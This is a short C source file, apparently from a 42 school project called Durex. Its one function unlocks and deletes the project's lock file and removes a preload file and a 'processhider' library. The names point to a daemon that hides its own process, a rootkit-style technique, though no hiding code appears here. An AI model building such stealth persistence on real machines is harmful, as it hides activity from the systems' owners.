/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   quit.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/08/04 20:36:36 by gbourgeo          #+#    #+#             */
/*   Updated: 2019/08/04 20:49:30 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* remove */
#include <stdio.h>
#include "main.h"

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	remove(DUREX_PRELOAD);
	remove(DUREX_PROCESSHIDER_LIB);
}
